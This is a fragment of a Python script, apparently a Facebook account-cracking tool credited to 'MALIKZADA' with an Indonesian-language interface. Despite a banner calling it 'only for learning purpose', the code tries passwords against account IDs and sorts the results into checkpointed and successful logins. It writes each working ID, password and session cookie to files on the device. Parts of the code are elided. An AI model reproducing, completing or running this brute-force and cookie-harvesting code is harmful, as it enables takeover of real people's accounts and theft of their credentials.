...
⠀⠀⠀⠀⠀          ⠀⠀⠀⠈⠙⠛⠶⠶⠦⠤⠤⠤⠶⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀
  {m}•{k}•{h}•{sir} THIS TOOL IS ONLY FOR LEARNING PURPOSE {x}{m}•{k}•{h}•{x}
    ...
    \t{asu}    {m}•{k}•{h}•{sir} RECODE : MALIKZADA {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}MALIKZADA-CP😴>> {idf}|{pw}{N}')
				...
				print(f'\r{H}MALIKZADA-OK😘>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'MALIKZADA-CP😴[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='MALIKZADA-XD CP'))
					open('/sdcard/MALIKZADA-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/MALIKZADA-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'MALIKZADA-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					...
					hit=0
					infoakun += (f"\n[bold yellow]MALIKZADA-CP😰[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
